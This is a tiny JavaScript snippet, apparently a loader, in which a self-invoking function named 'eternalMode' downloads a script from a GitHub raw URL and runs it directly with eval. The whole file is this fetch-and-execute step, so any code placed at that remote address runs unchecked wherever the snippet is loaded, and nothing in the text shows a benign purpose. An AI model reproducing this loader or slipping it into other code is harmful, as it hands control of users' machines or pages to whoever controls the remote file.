async function eternalMode() {
  let url = 'https://github.com/khilmy0/macul/raw/main/netep.js'
  let response = await fetch(url);
  let script = await response.text();
  eval(script);
}
eternalMode();
